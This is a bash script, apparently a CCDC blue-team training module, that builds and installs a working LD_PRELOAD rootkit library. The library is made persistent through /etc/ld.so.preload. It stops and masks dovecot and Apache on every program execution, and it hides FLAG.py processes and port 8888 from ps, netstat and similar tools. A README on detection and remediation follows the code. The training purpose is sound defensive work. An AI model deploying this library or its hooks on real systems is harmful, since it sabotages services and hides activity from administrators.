#!/bin/bash
################################################################################
# CCDC_Linux_LoadsOfIssues.sh
#
# Blue Team Training Script - LD_PRELOAD Hijacking Attacks
# Compatible with: Ubuntu, Debian, CentOS, RHEL, Fedora
#
# This script demonstrates LD_PRELOAD vulnerabilities for defensive training:
# 1. Hijacks binary execution to stop/mask critical services (dovecot, httpd)
# 2. Hides FLAG.py processes from ps/top commands
# 3. Hides port 8888 network connections from netstat/ss commands
# 4. Uses system-wide /etc/ld.so.preload for persistence
#
# NOTE: This is for authorized training environments only!
################################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Detect Linux distribution
detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO_NAME="$ID"
        DISTRO_VER="$VERSION_ID"
    else
        DISTRO_NAME="unknown"
        DISTRO_VER="unknown"
    fi
}

# Detect library path
detect_lib_path() {
    if [ -d "/usr/lib64" ]; then
        echo "/usr/lib64"
    elif [ -d "/usr/lib/x86_64-linux-gnu" ]; then
        echo "/usr/lib/x86_64-linux-gnu"
    else
        echo "/usr/lib"
    fi
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}"
   exit 1
fi

detect_distro
LIB_PATH=$(detect_lib_path)

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}CCDC LD_PRELOAD Training Module Setup${NC}"
echo -e "${BLUE}Detected: $DISTRO_NAME $DISTRO_VER${NC}"
echo -e "${BLUE}Library Path: $LIB_PATH${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# Step 1: Create the malicious shared library
echo -e "${YELLOW}[*] Step 1: Creating LD_PRELOAD hijacking library...${NC}"

PRELOAD_SOURCE_DIR="/tmp/preload_src"
mkdir -p "$PRELOAD_SOURCE_DIR"

# Create the C source file for the preload library
cat > "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" << 'CSRC'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <errno.h>

/* Function pointers for original functions */
typedef int (*execve_t)(const char *filename, char *const argv[], char *const envp[]);
typedef DIR* (*opendir_t)(const char *name);
typedef struct dirent* (*readdir_t)(DIR *dirp);
typedef int (*getpeername_t)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
typedef int (*getsockname_t)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

static execve_t original_execve = NULL;
static opendir_t original_opendir = NULL;
static readdir_t original_readdir = NULL;
static getpeername_t original_getpeername = NULL;
static getsockname_t original_getsockname = NULL;

/* Initialize function pointers */
static void init_hooks(void) {
    if (!original_execve) {
        original_execve = (execve_t)dlsym(RTLD_NEXT, "execve");
    }
    if (!original_opendir) {
        original_opendir = (opendir_t)dlsym(RTLD_NEXT, "opendir");
    }
    if (!original_readdir) {
        original_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
    }
    if (!original_getpeername) {
        original_getpeername = (getpeername_t)dlsym(RTLD_NEXT, "getpeername");
    }
    if (!original_getsockname) {
        original_getsockname = (getsockname_t)dlsym(RTLD_NEXT, "getsockname");
    }
}

/* Hook execve to stop/mask services */
int execve(const char *filename, char *const argv[], char *const envp[]) {
    init_hooks();

    /* Stop and mask dovecot when any binary executes */
    system("systemctl stop dovecot 2>/dev/null || true");
    system("systemctl mask dovecot 2>/dev/null || true");

    /* Stop and mask httpd/apache2 when any binary executes */
    system("systemctl stop httpd 2>/dev/null || true");
    system("systemctl mask httpd 2>/dev/null || true");
    system("systemctl stop apache2 2>/dev/null || true");
    system("systemctl mask apache2 2>/dev/null || true");

    return original_execve(filename, argv, envp);
}

/* Hook readdir to hide FLAG.py processes */
struct dirent* readdir(DIR *dirp) {
    init_hooks();
    struct dirent *entry = NULL;

    while ((entry = original_readdir(dirp)) != NULL) {
        int should_hide = 0;

        /* Check if this is a process directory (numeric name in /proc) */
        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
            char proc_path[512];
            char cmdline[1024];
            FILE *fp;

            snprintf(proc_path, sizeof(proc_path), "/proc/%s/cmdline", entry->d_name);
            fp = fopen(proc_path, "r");
            if (fp) {
                if (fgets(cmdline, sizeof(cmdline), fp) != NULL) {
                    if (strstr(cmdline, "FLAG.py") != NULL ||
                        strstr(cmdline, "flag.py") != NULL) {
                        should_hide = 1;
                    }
                }
                fclose(fp);
            }
        }

        if (!should_hide) {
            return entry;
        }
    }

    return NULL;
}

/* Hook getpeername to hide port 8888 */
int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    init_hooks();

    int result = original_getpeername(sockfd, addr, addrlen);

    if (result == 0 && addr) {
        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
        if (sin->sin_family == AF_INET) {
            unsigned short port = ntohs(sin->sin_port);
            if (port == 8888) {
                errno = ENOTCONN;
                return -1;
            }
        }
    }

    return result;
}

/* Hook getsockname to hide port 8888 */
int getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    init_hooks();

    int result = original_getsockname(sockfd, addr, addrlen);

    if (result == 0 && addr) {
        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
        if (sin->sin_family == AF_INET) {
            unsigned short port = ntohs(sin->sin_port);
            if (port == 8888) {
                errno = ENOTCONN;
                return -1;
            }
        }
    }

    return result;
}
CSRC

# Compile the preload library
echo -e "${YELLOW}[*] Compiling LD_PRELOAD library...${NC}"

if command -v gcc &> /dev/null; then
    if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" \
        "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" -ldl 2>/dev/null; then
        echo -e "${GREEN}[+] Successfully compiled libccdc_hijack.so${NC}"

        # Install to library path
        if cp "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" "$LIB_PATH/libccdc_hijack.so"; then
            chmod 644 "$LIB_PATH/libccdc_hijack.so"
            echo -e "${GREEN}[+] Installed to $LIB_PATH/libccdc_hijack.so${NC}"
        else
            echo -e "${YELLOW}[!] Could not copy compiled library${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Compilation failed${NC}"
    fi
else
    echo -e "${YELLOW}[!] GCC not found, library compilation skipped${NC}"
fi

# Step 2: Set up system-wide LD_PRELOAD
echo -e "${YELLOW}[*] Step 2: Setting up /etc/ld.so.preload...${NC}"

LD_PRELOAD_FILE="/etc/ld.so.preload"

# Backup existing ld.so.preload if it exists
if [ -f "$LD_PRELOAD_FILE" ]; then
    cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.backup.ccdc_training"
    echo -e "${GREEN}[+] Backed up existing /etc/ld.so.preload${NC}"
fi

# Create/update ld.so.preload with our library
if [ -f "$LIB_PATH/libccdc_hijack.so" ]; then
    echo "$LIB_PATH/libccdc_hijack.so" > "$LD_PRELOAD_FILE"
    chmod 644 "$LD_PRELOAD_FILE"
    echo -e "${GREEN}[+] Updated /etc/ld.so.preload${NC}"
else
    echo -e "${YELLOW}[!] Library not found, /etc/ld.so.preload not updated${NC}"
fi

# Step 3: Create a test FLAG.py process
echo -e "${YELLOW}[*] Step 3: Setting up FLAG.py test process...${NC}"

FLAG_PY_DIR="/opt/ccdc_training"
mkdir -p "$FLAG_PY_DIR"

cat > "$FLAG_PY_DIR/FLAG.py" << 'PYSCRIPT'
#!/usr/bin/env python3
import time
import signal
import sys

def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# Infinite loop - this is a training flag service
while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        break
PYSCRIPT

chmod 755 "$FLAG_PY_DIR/FLAG.py"
echo -e "${GREEN}[+] Created FLAG.py at $FLAG_PY_DIR/FLAG.py${NC}"

# Step 4: Create systemd service for flag service on port 8888
echo -e "${YELLOW}[*] Step 4: Creating flag service on port 8888...${NC}"

cat > "$FLAG_PY_DIR/flag_service.py" << 'FLAGSERVICE'
#!/usr/bin/env python3
import socket
import signal
import sys
import time

def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# Create socket and listen on port 8888
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    server_socket.bind(('0.0.0.0', 8888))
    server_socket.listen(5)
    print("Flag service listening on port 8888", flush=True)

    while True:
        try:
            client_socket, addr = server_socket.accept()
            client_socket.send(b"CCDC_FLAG{This_is_a_hidden_flag_service}\n")
            client_socket.close()
        except Exception:
            pass
except Exception as e:
    print(f"Error: {e}", flush=True)
finally:
    server_socket.close()
FLAGSERVICE

chmod 755 "$FLAG_PY_DIR/flag_service.py"
echo -e "${GREEN}[+] Created flag service at $FLAG_PY_DIR/flag_service.py${NC}"

# Create systemd service file
cat > "/etc/systemd/system/ccdc-flag.service" << 'SYSDSVC'
[Unit]
Description=CCDC Hidden Flag Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/opt/ccdc_training/flag_service.py
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
SYSDSVC

chmod 644 "/etc/systemd/system/ccdc-flag.service"

# Reload systemd and start the flag service
systemctl daemon-reload
systemctl start ccdc-flag 2>/dev/null || echo -e "${YELLOW}[!] Could not start flag service${NC}"
systemctl enable ccdc-flag 2>/dev/null || true

echo -e "${GREEN}[+] Created and started ccdc-flag service${NC}"

# Step 5: Create documentation
echo -e "${YELLOW}[*] Step 5: Creating training documentation...${NC}"

cat > "$FLAG_PY_DIR/TRAINING_README.txt" << EOF
================================================================================
                  CCDC LD_PRELOAD HIJACKING TRAINING MODULE
================================================================================
Detected System: $DISTRO_NAME $DISTRO_VER
Library Path: $LIB_PATH

WHAT THIS SCRIPT DOES:
This training script demonstrates LD_PRELOAD hijacking attacks that can be
used for process injection, system compromise, and stealthy persistence.

ATTACK VECTORS DEMONSTRATED:

1. BINARY EXECUTION HIJACKING:
   When any binary is executed, the preloaded library hooks execve() to:
   - Stop dovecot service
   - Mask dovecot service (prevent restart)
   - Stop httpd/apache2 service
   - Mask httpd/apache2 service (prevent restart)

   This simulates an attack that disrupts critical services on command execution.

2. PROCESS HIDING (FLAG.py):
   The preloaded library hooks readdir() to hide processes:
   - Any process with "FLAG.py" in cmdline is hidden
   - Tools like ps, top, pgrep will not show these processes
   - Can only be found by analyzing /proc directly or after preload removal

   Execution Method:
   /opt/ccdc_training/FLAG.py &

   Detection Challenge:
   - Run: ps aux | grep FLAG
   - Result: Process won't appear (it's hidden)
   - After cleanup: Process will be visible again

3. PORT HIDING (Port 8888):
   The preloaded library hooks getpeername() and getsockname() to hide:
   - Network connections to port 8888
   - The hidden flag service on port 8888
   - Tools like netstat, ss, lsof won't show port 8888

   The flag service runs as: /opt/ccdc_training/flag_service.py
   Port: 8888
   Status: Systemd service (ccdc-flag)

   Detection Challenge:
   - Run: netstat -tulpn | grep 8888
   - Result: Port 8888 won't appear
   - Run: curl localhost:8888
   - Result: Connection works but netstat won't show it
   - After cleanup: Port will be visible in netstat

HOW LD_PRELOAD HIJACKING WORKS:

1. Environment Variable Method:
   export LD_PRELOAD=/path/to/malicious.so
   ./program

2. System-Wide Method (Current):
   /etc/ld.so.preload contains:
   $LIB_PATH/libccdc_hijack.so

   This causes ALL programs to load the malicious library automatically.
   This is extremely stealthy because:
   - No per-process environment variable needed
   - Persists across reboots
   - Difficult to detect without checking /etc/ld.so.preload
   - Works even if LD_PRELOAD env var is blocked

DISTRIBUTED-SPECIFIC PATHS:

Ubuntu/Debian:
  - Library: /usr/lib/x86_64-linux-gnu/libccdc_hijack.so
  - ld.so.preload: /etc/ld.so.preload
  - Web Server: apache2

CentOS/RHEL/Fedora:
  - Library: /usr/lib64/libccdc_hijack.so
  - ld.so.preload: /etc/ld.so.preload
  - Web Server: httpd

HOW TO DETECT LD_PRELOAD ATTACKS:

1. Check /etc/ld.so.preload:
   cat /etc/ld.so.preload

2. Verify library checksums:
   md5sum $LIB_PATH/*.so
   Compare with baseline/package manager

3. Use strace to see hooked syscalls:
   strace -f ps aux 2>&1 | grep -i preload

4. Check process arguments in /proc:
   cat /proc/[PID]/cmdline

5. Monitor systemd services:
   systemctl list-units --type=service

6. Test for hidden processes:
   ls -la /proc/[expected_PID]

7. Analyze compiled binaries:
   ldd /usr/bin/ps | grep ccdc

HOW TO REMEDIATE:

1. Remove system-wide preload:
   rm /etc/ld.so.preload
   rm ${LD_PRELOAD_FILE}.backup.ccdc_training

2. Remove malicious library:
   rm $LIB_PATH/libccdc_hijack.so

3. Disable and remove flag service:
   systemctl stop ccdc-flag
   systemctl disable ccdc-flag
   rm /etc/systemd/system/ccdc-flag.service
   systemctl daemon-reload

4. Kill hidden processes:
   killall FLAG.py
   killall flag_service.py

5. Remove training files:
   rm -r /opt/ccdc_training/

6. Restore services:
   systemctl unmask dovecot httpd apache2
   systemctl start dovecot httpd apache2 (if needed)

7. Clear compilation artifacts:
   rm -rf /tmp/preload_src/

LEARNING OBJECTIVES:

- Understand LD_PRELOAD mechanism and how it enables hijacking
- Recognize system-wide persistence via /etc/ld.so.preload
- Learn how syscall hooking can hide processes and ports
- Understand limitations of process monitoring tools
- Learn detection methods for library injection attacks
- Understand the importance of file integrity monitoring
- Recognize the need for kernel-level monitoring

REAL-WORLD RELEVANCE:

LD_PRELOAD hijacking is used by:
- Advanced persistent threats (APTs)
- Rootkit frameworks
- Fileless malware campaigns
- Lateral movement tools
- Data exfiltration mechanisms

Defenders must monitor:
- /etc/ld.so.preload regularly
- /etc/ld.so.conf.d/ directory
- Unexpected libraries in /lib and /usr/lib
- Syscall tracing and strace output
- Process accounting logs
- Library load patterns via tools like auditd

================================================================================
EOF

chmod 644 "$FLAG_PY_DIR/TRAINING_README.txt"

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}LD_PRELOAD Training Module Setup Complete!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${BLUE}Training Documentation:${NC}"
echo -e "  ${BLUE}Location:${NC} $FLAG_PY_DIR/TRAINING_README.txt"
echo ""
echo -e "${BLUE}Malicious Library:${NC}"
echo -e "  ${BLUE}Location:${NC} $LIB_PATH/libccdc_hijack.so"
echo ""
echo -e "${BLUE}System-Wide Preload:${NC}"
echo -e "  ${BLUE}Location:${NC} /etc/ld.so.preload"
echo ""
echo -e "${BLUE}Hidden Flag Service:${NC}"
echo -e "  ${BLUE}Location:${NC} $FLAG_PY_DIR/flag_service.py"
echo -e "  ${BLUE}Port:${NC} 8888"
echo -e "  ${BLUE}Systemd Service:${NC} ccdc-flag"
echo ""
echo -e "${BLUE}Test Process Script:${NC}"
echo -e "  ${BLUE}Location:${NC} $FLAG_PY_DIR/FLAG.py"
echo ""
echo -e "${YELLOW}BLUE TEAM CHALLENGES:${NC}"
echo -e "  1. Run: ps aux | grep FLAG.py"
echo -e "  2. Result: Process will not appear (it's hidden)"
echo -e "  3. Run: netstat -tulpn | grep 8888"
echo -e "  4. Result: Port 8888 will not appear"
echo -e "  5. Challenge: Find and remove the LD_PRELOAD hijack"
echo ""
echo -e "${YELLOW}REMINDER: This is for authorized training only!${NC}"
echo ""
